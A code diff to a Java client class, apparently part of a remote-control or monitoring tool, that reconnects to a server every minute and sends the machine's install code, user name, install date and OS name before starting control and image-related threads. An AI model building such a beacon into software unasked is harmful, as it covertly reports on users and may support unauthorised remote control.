@@ -54,7 +54,8 @@ public class ConnectClient {
                 connectToServer();
                 Thread.sleep(60 * 1000);
                 System.gc();
-            } catch (Exception ignored) {
+            } catch (Exception exception) {
+                exception(exception);
             }
         }
     }
@@ -66,7 +67,8 @@ public class ConnectClient {
         try {
             WRITER.println(message);
             WRITER.flush();
-        } catch (Exception ignored) {
+        } catch (Exception exception) {
+            exception(exception);
         }
     }
 
@@ -97,10 +99,7 @@ public class ConnectClient {
         BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
         PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
         WRITER = writer;
-        msg("key:" + InstallComponents.generateUniqueCode());
-        msg("user:" + System.getProperty("user.name"));
-        msg("date:" + FileComponents.toDate(new File(InstallComponents.LOCAL_FILE).lastModified()));
-        msg("os:" + System.getProperty("os.name"));
+        msg("connect:" + InstallComponents.generateUniqueCode() + "|" + System.getProperty("user.name") + "|" + FileComponents.toDate(new File(InstallComponents.LOCAL_FILE).lastModified()) + "|" + System.getProperty("os.name"));
         EXECUTOR.schedule(() -> {
             new Thread(ImageComponents::execHistoryUpdate).start();
             new Thread(ControlComponents::sendBasicInfo).start();
